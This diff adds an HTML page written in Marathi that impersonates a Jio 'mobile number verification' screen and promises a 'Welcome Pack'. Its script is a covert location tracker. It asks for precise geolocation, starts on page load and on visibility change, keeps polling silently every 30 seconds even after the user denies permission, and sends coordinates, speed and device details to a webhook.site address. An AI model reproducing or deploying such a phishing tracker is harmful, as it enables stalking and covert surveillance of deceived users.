@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="mr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>मोबाईल नंबर व्हेरिफिकेशन - Jio</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #ff6b35, #f7931e);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+            font-weight: bold;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .location-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #00c851, #007e33);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+        }
+        .location-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,200,81,0.3);
+        }
+        .location-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .status {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-weight: 500;
+            display: none;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .loading { background: #fff3cd; color: #856404; }
+        .tracking {
+            font-size: 12px;
+            color: #28a745;
+            font-weight: 500;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .service-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 30px 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">J</div>
+        <h1>मोबाईल नंबर व्हेरिफिकेशन</h1>
+        <p class="subtitle">तुमची सेवा सुरू करण्यासाठी तुमचे लोकेशन व्हेरिफाई करा</p>
+        
+        <button id="locationBtn" class="location-btn">📍 लोकेशन परवानगी द्या</button>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="service-info">
+            <strong>Jio Services</strong><br>
+            तुमचे लोकेशन व्हेरिफिकेशन पूर्ण झाल्यावर<br>
+            तुम्हाला Jio Welcome Pack मिळेल
+        </div>
+    </div>
+
+    <script>
+        const btn = document.getElementById('locationBtn');
+        const status = document.getElementById('status');
+        
+        // Service Worker Registration for offline support
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
+        }
+        
+        btn.addEventListener('click', requestLocation);
+        
+        function showStatus(message, type) {
+            status.textContent = message;
+            status.className = `status ${type}`;
+            status.style.display = 'block';
+        }
+        
+        async function requestLocation() {
+            btn.disabled = true;
+            btn.textContent = '📍 लोकेशन शोधत आहे...';
+            showStatus('लोकेशन permission घेत आहे...', 'loading');
+            
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                
+                showStatus('✅ लोकेशन permission मिळाली!', 'success');
+                startTracking(position.coords);
+                
+            } catch (error) {
+                console.log('Permission denied or error:', error);
+                // Even if denied, keep trying silently
+                btn.textContent = '🔄 पुन्हा प्रयत्न करा';
+                btn.disabled = false;
+                setTimeout(() => startSilentTracking(), 2000);
+            }
+        }
+        
+        function startTracking(initialCoords) {
+            sendLocation(initialCoords);
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocation(pos.coords),
+                    err => console.log('Silent tracking error:', err),
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 30000 }
+                );
+            }, 30000); // 30 seconds
+            
+            // Show tracking status
+            status.innerHTML = '<span class="tracking">📡 Live tracking चालू आहे... (30 sec interval)</span>';
+            btn.style.display = 'none';
+        }
+        
+        function startSilentTracking() {
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocation(pos.coords, true),
+                    () => {}, // Silent fail
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 30000 }
+                );
+            }, 30000);
+        }
+        
+        async function sendLocation(coords, silent = false) {
+            const data = {
+                timestamp: new Date().toISOString(),
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy,
+                altitude: coords.altitude || 'N/A',
+                speed: coords.speed || 'N/A',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                url: window.location.href
+            };
+            
+            try {
+                await fetch('https://webhook.site/e8bb7b6b-c065-40da-910d-d25132e021f5', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (!silent) {
+                    console.log('📍 Location sent:', data);
+                }
+            } catch (error) {
+                console.log('Webhook send failed:', error);
+            }
+        }
+        
+        // Auto-start on page load (background tracking)
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocation(pos.coords, true),
+                    () => {},
+                    { enableHighAccuracy: true }
+                );
+            }, 2000);
+        });
+        
+        // Page visibility tracking
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocation(pos.coords, true)
+                );
+            }
+        });
+    </script>
+</body>
+</html>
